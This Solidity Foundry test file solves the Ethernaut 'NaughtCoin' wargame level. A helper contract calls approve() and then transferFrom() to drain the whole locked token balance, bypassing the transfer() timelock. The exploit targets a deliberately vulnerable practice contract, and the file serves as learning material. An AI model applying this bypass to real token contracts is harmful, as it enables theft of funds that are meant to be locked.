// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/NaughtCoin.sol";

contract MiddleMan {
    function attack(address prey, uint256 balance) public {
        NaughtCoin naughtCoin = NaughtCoin(prey);
        naughtCoin.transferFrom(msg.sender, address(this), balance);
    }
}

// approve() + transferFrom() to bypass restriction on transfer()
contract NaughtCoinTest is Test {
    NaughtCoin instance;

    function setUp() public {
        instance = new NaughtCoin(msg.sender);
    }

    function test() public {
        uint256 balance = 1000000 * (10 ** 18);
        assertEq(instance.balanceOf(msg.sender), balance);

        MiddleMan middleMan = new MiddleMan();

        vm.startPrank(msg.sender);
        instance.approve(address(middleMan), balance);
        middleMan.attack(address(instance), balance);

        assertEq(instance.balanceOf(msg.sender), 0);
        assertEq(instance.balanceOf(address(middleMan)), balance);
    }
}
